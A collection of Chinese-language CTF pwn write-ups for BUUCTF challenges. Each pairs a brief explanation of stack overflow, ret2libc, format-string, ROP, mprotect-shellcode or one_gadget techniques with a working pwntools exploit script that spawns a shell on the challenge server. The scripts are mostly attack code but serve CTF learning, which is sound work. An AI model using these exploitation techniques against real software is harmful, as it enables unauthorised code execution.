## 0x00 test_your_nc
### ans
测试nc  
nc上直接可以得到shell
### exp
```python
from pwn import *
context.log_level = "debug"
io = remote('node3.buuoj.cn','26984')
io.interactive()
```

# 0x01 rip
### ans ret2text  
gets()函数的简单栈溢出，没有任何保护。  
选择栈溢出覆盖 $rip 为后门函数地址。
### tips
输入地址要使用 p32() ， p64() 函数打包  

远程测试报错
 - timeout: the monitored command dumped core    

由于栈对齐的原因，本次选择修改后门函数的地址 0x401186 --> 0x40118A 。  
不使用后门函数的开始地址，直接使用 system 函数前的地址。

```c++
.text:0000000000401186                 public fun             // 不用这里
.text:0000000000401186 fun             proc near
.text:0000000000401186 ; __unwind {
.text:0000000000401186                 push    rbp
.text:0000000000401187                 mov     rbp, rsp
.text:000000000040118A                 lea     rdi, command    ; "/bin/sh"  //用这里
.text:0000000000401191                 call    _system
.text:0000000000401196                 nop
.text:0000000000401197                 pop     rbp
.text:0000000000401198                 retn
.text:0000000000401198 ; } // starts at 401186
```

### exp
```python
from pwn import *
context.log_level = "debug"

# shell = 0x401186
shell = 0x40118A

# io = process('./rip')
io = remote('node3.buuoj.cn','29905')

payload = (0xf + 8) * 'a' + p64(shell)
# io.recv()
io.sendline(payload)
# io.sendlineafter("please input",payload)

io.interactive()
```

## 0x02 warmup_csaw_2016
### ans  ret2text
和上面一题考点相同  
这次后门函数的地址由程序直接输出。
gets()函数的简单栈溢出，没有任何保护。  
选择栈溢出覆盖 $rip 为后门函数地址。
### exp
```python
from pwn import *
context.log_level = "debug"

shell = 0x400611

# io = process('./warmup_csaw_2016')
io = remote('node3.buuoj.cn','27284')


payload = (0x40 + 8) * 'a' + p64(shell)
# io.recv()
io.sendline(payload)
# io.sendlineafter("please input",payload)

io.interactive()
```

## 0x03 pwn1_sctf_2016
### ans  ret2text
```c++
int vuln()
{
  const char *v0; // eax
  char s; // [esp+1Ch] [ebp-3Ch]  // 这里0x3C是偏移
  char v3; // [esp+3Ch] [ebp-1Ch]
  char v4; // [esp+40h] [ebp-18h]
  char v5; // [esp+47h] [ebp-11h]
  char v6; // [esp+48h] [ebp-10h]
  char v7; // [esp+4Fh] [ebp-9h]

  printf("Tell me something about yourself: ");
  fgets(&s, 32, edata);
  std::string::operator=(&input, &s);
  std::allocator<char>::allocator(&v5);
  std::string::string(&v4, "you", &v5);
  std::allocator<char>::allocator(&v7);
  std::string::string(&v6, "I", &v7);
  replace((std::string *)&v3);
  std::string::operator=(&input, &v3, &v6, &v4);
  std::string::~string((std::string *)&v3);
  std::string::~string((std::string *)&v6);
  std::allocator<char>::~allocator(&v7);
  std::string::~string((std::string *)&v4);
  std::allocator<char>::~allocator(&v5);
  v0 = (const char *)std::string::c_str((std::string *)&input);
  strcpy(&s, v0);
  return printf("So, %s\n", &s);
}
```
存在溢出点的是s这个变量，偏移是0x3C（10进制的60）。  
但是fgets的长度限制在了32。怎么办呢？  
程序把输入的 “I” 都替换成了 “you”  
当输入20个“I”的时候就变成了20个“you”，这样长度就变成60了。  
溢出就在这里出现了。

### exp
```python
from pwn import *
context.log_level = "debug"

# io = process('./pwn1_sctf_2016')
io = remote('node3.buuoj.cn','25120')

shell = 0x08048F0D
payload = "I" * 20 + "a" * 4 + p32(shell) 
# 0x3c+4 == 3*20+4 
io.sendline(payload)
io.interactive()

```
## 0x04 ciscn_2019_n_1
### ans  
```c++
  int result; // eax
  char v1; // [rsp+0h] [rbp-30h]
  float v2; // [rsp+2Ch] [rbp-4h]

  v2 = 0.0;
  puts("Let's guess the number.");
  gets(&v1); //溢出点
  if ( v2 == 11.28125 )
    result = system("cat /flag");
```
通过gets函数把v2覆盖，使其通过if的验证。

```c++
.text:00000000004006B5                 ucomiss xmm0, cs:dword_4007F4
.text:00000000004006BC                 jnz     short loc_4006CF
.text:00000000004006BE                 mov     edi, offset command ; "cat /flag"
.text:00000000004006C3                 mov     eax, 0
.text:00000000004006C8                 call    _system
```
查看该段函数的汇编，在 if 的判断条件中找到对应的 11.28125 的浮点数表示。  
应该是会 jnz 命令前的一句中出现。  
点进 cs:dword_4007F4 中查看，如下图： 

```c++
.rodata:00000000004007F4 dword_4007F4    dd 41348000h            ; DATA XREF: func+31↑r
.rodata:00000000004007F4                                         ; func+3F↑r
```
0x4007F4 处写着41348000h 这就是 11.28125 的浮点数表示。  

### exp
```python
from pwn import *
context.log_level = "debug"

# io = process('./ciscn_2019_n_1')
io = remote('node3.buuoj.cn','25138')

v1 = (0x30-4)* 'a'
v2 = 0x41348000
payload = v1 + p64(v2)

io.sendline(payload)
io.interactive()
```

## 0x05 ciscn_2019_c_1
### ans  ret2libc

```c++
  puts("Input your Plaintext to be encrypted");
  gets(s); // 溢出点
```
在程序的 encrypt()函数中找到栈溢出。  
本次溢出没有 system 可以利用，所以需要使用 ret2libc 方法。  

两次利用栈溢出：  

第一次泄露任意一个函数地址，计算 libc 基址，确定 system 和 binsh 字符串的地址。覆盖 $rip 为 puts_plt 地址，调用 puts 函数输出 puts 函数的地址。
- 泄露过程由两部分组成
     1. 输出函数： 用来泄露函数地址，这里选择 puts 函数为输出函数。
     2. 被泄露的函数地址：可以是任意的、已经使用过的函数地址，这里还是选择 puts 函数。  

第二次是利用栈溢出 getshell ，与 ret2text 相同。  


总结为两个步骤：
1.  puts (puts_addr)
2.  system("/bin/sh")

### tips 栈布局

32位与64位下的参数调用是不同的  
32位利用栈传递参数  
64位利用寄存器和栈传递参数  


32位 rop 链构造：
func(arg1,arg2,...)| 
---|
func |
ret_addr |
arg1 |
arg2 |
... |


64位 rop 链构造：
func(arg1,arg2,...)| 
---|
gadget1   (pop rdi;ret)|
arg1 |
gadget2  (pop rsi;ret) |
arg2 |
... |
func |



详见 ctf-wiki


### exp
```python
from pwn import *
from LibcSearcher import LibcSearcher
context.log_level = "debug"

# io = process('./ciscn_2019_c_1')
io = remote('node3.buuoj.cn','28729')
e = ELF('./ciscn_2019_c_1')

io.sendlineafter("your choice!\n","1")

pop_rdi = 0x400c83
ret_addr = 0x4006b9
puts_plt = e.plt['puts']
puts_got = e.got['puts']


payload = 0x58 * 'a' + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(e.symbols['main'])
io.sendlineafter("to be encrypted\n",payload)

io.recvuntil("Ciphertext\n")
io.recvline()
puts_addr = u64(io.recv(6).ljust(8, '\x00'))

success("puts_addr   " + hex(puts_addr))


# libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
# libc_base = puts_addr - libc.sym["puts"]
# system_addr = libc_base + libc.sym["system"]
# binsh_addr = libc_base + next(libc.search("/bin/sh"))

libc = LibcSearcher('puts', puts_addr)
libc_base = puts_addr - libc.dump('puts')
system_addr = libc_base + libc.dump('system')
binsh_addr = libc_base + libc.dump('str_bin_sh')

# system_addr = puts_addr - 0x31580
# binsh_addr = puts_addr + 0x1334da

success("system_addr   " + hex(system_addr))
success("binsh_addr   " + hex(binsh_addr))


io.sendlineafter("your choice!\n","1")
# gdb.attach(io)
payload = 0x58 * 'a' + p64(ret_addr) +p64(pop_rdi) + p64(binsh_addr) + p64(system_addr)
io.sendlineafter("to be encrypted\n",payload)


io.recvuntil("Ciphertext\n")
io.recvline()
io.sendline('cat flag')
io.recvline()


io.sendline(payload)
```

### ctjx

1. recv 一定要设置正确！这道题recvline() , recv(8) 都不行
2. libc 版本一定要正确，要么用给的，要么就用libcseacher
3. "timeout: the monitored command dumped core" ：由于对齐原因，需要平衡栈，使用ret命令（1-15）次

## 0x06 [OGeek2019]babyrop
### ans ret2libc

首先是绕过验证：
```c++
  memset(&s, 0, 0x20u);
  memset(buf, 0, 0x20u);
  sprintf(&s, "%ld", a1);
  v6 = read(0, buf, 0x20u);
  buf[v6 - 1] = 0;
  v1 = strlen(buf);
  if ( strncmp(buf, &s, v1) )
    exit(0);
  write(1, "Correct\n", 8u);
  return v5;
```
strlen() 函数是通过 '\x00' 来判断字符串的结束的。  
所以把输入字符串的第一个字符写为 '\x00' 就可绕过验证。

```c++
 if ( a1 == 127 )
    result = read(0, &buf, 0xC8u);
  else
    result = read(0, &buf, a1); // 溢出点
```
这里的 a1 就是之前输入的 buf 的大小。  
我们希望它越大越好，这样才能造成溢出。  
所以输入为 '\x00' + '\xff' * 7


绕过验证后，就是32位下的ret2libc
1. write(1,write_addr,8)
2. system("/bin/sh")

### exp
```python
from pwn import *
context.log_level = "debug"

# io = process('./OGeek2019_babyrop')
io = remote('node3.buuoj.cn','29730')
e = ELF('./OGeek2019_babyrop')

write_plt = e.plt['write']
write_got = e.got['write']
main_addr = 0x8048825

payload = '\x00' + '\xff' * 7
io.sendline(payload)
payload = (0xE7 + 4) * 'a' +  p32(write_plt) + p32(main_addr) + p32(1) + p32(write_got) + p32(0x8)
io.sendlineafter("Correct\n",payload)


write_addr=u32(io.recv(4).strip().ljust(4, '\x00'))
success('write_addr: ' + hex(write_addr))

# libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
libc = ELF("./OGeek2019_babyrop.so")
libc_base = write_addr - libc.sym["write"]
system_addr = libc_base + libc.sym["system"]
binsh_addr = libc_base + next(libc.search("/bin/sh"))

success("system_addr   " + hex(system_addr))
success("binsh_addr   " + hex(binsh_addr))


payload = '\x00' + '\xff' * 7
io.sendline(payload)
payload = (0xE7 + 4)  * 'a' +  p32(system_addr) + p32(0xdeadbeef) + p32(binsh_addr) 
io.sendlineafter("Correct",payload)


io.interactive()
```

## 0x07 ciscn_2019_en_2
### ans  ret2libc
雷同题： 0x05 ciscn_2019_c_1
### exp
```略```


## 0x08 jarvisoj_level0
### ans  ret2text
read() 长度过大造成的简单栈溢出
### exp
```python
from pwn import *
context.log_level = "debug"

# io = process('./jarvisoj_level0')
io = remote('node3.buuoj.cn','29100')

shell = 0x40059A

payload = 0x88 * 'a' + p64(shell)

io.sendlineafter("Hello, World\n",payload)

io.interactive()
```





## 0x09 [第五空间2019 决赛]PWN5
### ans  格式化字符串
```c++
 v1 = time(0);
  srand(v1);
  fd = open("/dev/urandom", 0);
  read(fd, &unk_804C044, 4u);
  printf("your name:");
  read(0, &buf, 0x63u);
  printf("Hello,");
  printf(&buf);
  printf("your passwd:");
  read(0, &nptr, 0xFu);
  if ( atoi(&nptr) == unk_804C044 )
  {
    puts("ok!!");
    system("/bin/sh");
  }
```
格式化字符串：  
使用爆破的方法测出格式化字符串参数的偏移。  
- 法一：   修改验证的字符串，使得输入的 nptr ==  unk_804C044  
- 法二：  修改 atoi() 为 system() 的地址，传入 “/bin/sh”。
 
想要泄露 unk_804C044 中的值理论上也可行，但是个人觉得比较勉强，毕竟不知道 0x804C044 在栈上的哪个位置。

### exp


```python
from pwn import *
context.log_level = "debug"

global offset

for i in range(2,20):
	r = process('./dwkj_pwn5')
	payload = "a%{0}$x".format(i)
	r.sendlineafter("name",payload)
	r.recvuntil("Hello,")
	data = r.recv(10)
	success(data)
	if '61' in data:
		offset = i
		break 
	r.close()


offset = 10
success("offset:" + str(offset))

# io = process('./dwkj_pwn5')
io = remote('node3.buuoj.cn','29220')

# # exp1
# check_addr = 0x804C044
# payload = fmtstr_payload(offset, {check_addr: 0x1})
# io.sendlineafter("name:",payload)
# io.sendlineafter("passwd:","1")

# exp2
e = ELF('./dwkj_pwn5')
atio_got = e.got['atoi']
system_plt = e.plt['system']
payload = fmtstr_payload(offset, {atio_got:system_plt})
io.sendlineafter("name:",payload)
io.sendlineafter("passwd:","/bin/sh\x00")

io.interactive()
```


from pwn import *

io = remote('node3.buuoj.cn', 27545)









## 0x0a get_started_3dsctf_2016
### ans  orw

orw：  
使用 open , read , write 三个函数对 flag 进行读写。  
找到 pop_3_ret 和 pop_2_ret，写到 ret 地址上，使得执行流能够再次回到布局好的栈上。

mprotect + shellcode:  
利用mprotect函数修改bss段的权限，让其有执行权限。  
再用read写入shellcode，然后跳转到bss段执行来getshell。

### exp  
```python

from pwn import *

io = remote('node3.buuoj.cn', 27545)
# io = process("./get_started_3dsctf_2016")
e = ELF("./get_started_3dsctf_2016")

pop_3_ret  = 0x809e4c5
pop_2_ret  = 0x806fc31
bss_addr   = 0x80EC000 
flag_addr  = 0x80BC388
open_addr  = e.symbols['open']
read_addr  = e.symbols['read']
write_addr = e.symbols['write'] 
mprotect_addr = e.symbols['mprotect']
mpr_len    = 0x1000
mpr_prot   = 7  # rxw=7
main_addr  = e.symbols['main']

# # orw
payload =  'a' * 0x38 + p32(open_addr) + p32(pop_2_ret) + p32(flag_addr) + p32(0) # pop2 跳过两个参数
payload += p32(read_addr) + p32(pop_3_ret) + p32(3) + p32(bss_addr) + p32(64) # pop3 跳过三个参数
payload += p32(write_addr) + 'dead' + p32(1) + p32(bss_addr) + p32(64)
io.sendline(payload)
io.interactive()

# # mprotect + shellcode
# shellcode = asm(shellcraft.sh())
# payload = 'a' *0x38 + p32(mprotect_addr) + p32(pop_3_ret) + p32(bss_addr) + p32(mpr_len) + p32(mpr_prot)
# payload += p32(read_addr) + p32(pop_3_ret) + p32(0) + p32(bss_addr) + p32(len(shellcode))
# payload += p32(bss_addr)
# io.sendline(payload)
# io.sendline(shellcode)
# io.interactive()

```

## 0x0b [BJDCTF 2nd]r2t3
### ans 
```c++
  char buf; // [esp+0h] [ebp-408h]

  my_init();
  puts("**********************************");
  puts("*     Welcome to the BJDCTF!     *");
  puts("[+]Ret2text3.0?");
  puts("[+]Please input your name:");
  read(0, &buf, 0x400u);
  name_check(&buf);
  puts("Welcome ,u win!");
  return 0;
```
没有溢出。。到name_check里面看看。

```c++
  char dest; // [esp+7h] [ebp-11h]
  unsigned __int8 v3; // [esp+Fh] [ebp-9h]

  v3 = strlen(s);
  if ( v3 <= 3u || v3 > 8u )
  {
    puts("Oops,u name is too long!");
    exit(-1);
  }
  printf("Hello,My dear %s", s);
  return strcpy(&dest, s);
```
必须绕过验证，unsigned int 有溢出的机会。

```c++
.text:080485E1                 call    _strlen
.text:080485E6                 add     esp, 10h
.text:080485E9                 mov     [ebp+var_9], al
.text:080485EC                 cmp     [ebp+var_9], 3
.text:080485F0                 jbe     short loc_804861F
.text:080485F2                 cmp     [ebp+var_9], 8
.text:080485F6                 ja      short loc_804861F
.text:080485F8                 sub     esp, 8
.text:080485FB                 push    [ebp+s]
.text:080485FE                 push    offset format   ; "Hello,My dear %s"
.text:08048603                 call    _printf
```
看到 080485E9 处使用 al 寄存器，可以进行4位的溢出。  
输入范围是 ( 3+256*i , 8+256*i ]   
我们选择 ( 0x103 , 0x108 ]

### exp 
```python
from pwn import *
context.log_level = "debug"
io = process('./r2t3')
io = remote('node3.buuoj.cn',25630)

payload = 'a'*0x15 + p32(0x0804858B) 
payload = payload.ljust(0x105,'b') 
io.recvuntil("[+]Please input your name:")
io.send(payload)
io.interactive()

```


## 0x0c ciscn_2019_n_8
### ans 

```c++
puts("What's your name?");
  __isoc99_scanf("%s", var, v4, v5);
  if ( *(_QWORD *)&var[13] )
  {
    if ( *(_QWORD *)&var[13] == 0x11LL )
      system("/bin/sh");
    else
      printf(
        "something wrong! val is %d",var[0],var[1],var[2],var[3],var[4], var[5], var[6], var[7], var[8],var[9], var[10], var[11],var[12],var[13],var[14]);
  }
  else
  {
    printf("%s, Welcome!\n", var);
    puts("Try do something~");
  }
```

输入的var是数组，var[13] == 0x11 时可以getshell

### exp
```python
from pwn import *
context.log_level = "debug"
# io = process('./ciscn_2019_n_8')
io = remote('node3.buuoj.cn','27094')
io.recvuntil("name?\n")
# payload = '\x11' * 53  #当时想自己手动二分法试试什么时候不报错，结果成功了
payload = p32(0x11) * 14
io.sendline(payload)
io.interactive()
```


## 0x0d not_the_same_3dsctf_2016
### ans orw 
同 0x10 get_started_3dsctf_2016  

ida中padding的长度错误，使用gdb + cyclic确定

### exp
```python
from pwn import *

# io = remote('node3.buuoj.cn', 27545)
io = process("./not_the_same_3dsctf_2016")
e = ELF("./not_the_same_3dsctf_2016")

pop_3_ret  = 0x0809e3e5
pop_2_ret  = 0x080483b9
bss_addr   = 0x80EC000 
flag_addr  = 0x80bc2a8
open_addr  = e.symbols['open']
read_addr  = e.symbols['read']
write_addr = e.symbols['write'] 
mprotect_addr = e.symbols['mprotect']
mpr_len    = 0x1000
mpr_prot   = 7  # rxw=7
main_addr  = e.symbols['main']

# # orw
# payload =  'a' * 0x2D + p32(open_addr) + p32(pop_2_ret) + p32(flag_addr) + p32(0)
# payload += p32(read_addr) + p32(pop_3_ret) + p32(3) + p32(bss_addr) + p32(64)
# payload += p32(write_addr) + 'dead' + p32(1) + p32(bss_addr) + p32(64)
# io.sendline(payload)
# io.interactive()

# # mprotect
shellcode = asm(shellcraft.sh())
payload = 'a' * 0x2D + p32(mprotect_addr) + p32(pop_3_ret) + p32(bss_addr) + p32(mpr_len) + p32(mpr_prot)
payload += p32(read_addr) + p32(pop_3_ret) + p32(0) + p32(bss_addr) + p32(len(shellcode))
payload += p32(bss_addr)
io.sendline(payload)
io.sendline(shellcode)
io.interactive()
```

## 0x0e [BJDCTF 2nd]one_gadget
### ans one_gadget
输出printf的地址  
确定libc基址  
计算one_gadget地址（一共四个，总有能成功的）

### exp
```python
from pwn import *
from LibcSearcher import LibcSearcher
context.log_level = "debug"
# io = process('./bjd_one_gadget')
io = remote('node3.buuoj.cn','29412')

io.recvuntil("here is the gift for u:")
printf_addr = int(io.recvline(),16)
success("printf_addr   " + hex(printf_addr))

# libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
libc = ELF("libc-2.29-64.so")
libc_base = printf_addr - libc.sym["printf"]

# one_gadget = [0x45216,0x4526a,0xf02a4,0xf1147]
one_gadget = [0xe237f,0xe2383,0xe2386, 0x106ef8]
one_gadget_addr = libc_base + one_gadget[3]

io.recvuntil("Give me your one gadget:")
io.sendline(str(one_gadget_addr))

io.interactive()
```

## 0x0f [HarekazeCTF2019]baby_rop
### ans ret2text
简单 ret2text 栈溢出
### exp
```python
from pwn import *
context.log_level = "debug"

# io = process('./hk_babyrop')
io = remote('node3.buuoj.cn','28332')
e = ELF('./hk_babyrop')

binsh_addr = 0x601048
system_addr = e.symbols['system']
pop_rdi = 0x0400683

io.recvuntil('your name?')
payload = 0x18 * 'a' + p64(pop_rdi) + p64(binsh_addr) + p64(system_addr)
io.sendline(payload)
io.interactive()
```

## 0x10 jarvisoj_level2
### ans ret2text
简单 ret2text 栈溢出
### exp
```python
from pwn import *
context.log_level = "debug"

# io = process('./jarvisoj_level2')
io = remote('node3.buuoj.cn','26699')
e = ELF('./jarvisoj_level2')

binsh_addr = 0x0804a029
system_addr = e.symbols['system']

io.recvuntil('Input:')
payload = (0x88 + 4) * 'a'  + p32(system_addr)  + 'dead'+ p32(binsh_addr)
io.sendline(payload)
io.interactive()
```

## 0x11 babyheap_0ctf_2017
### ans fastbin double free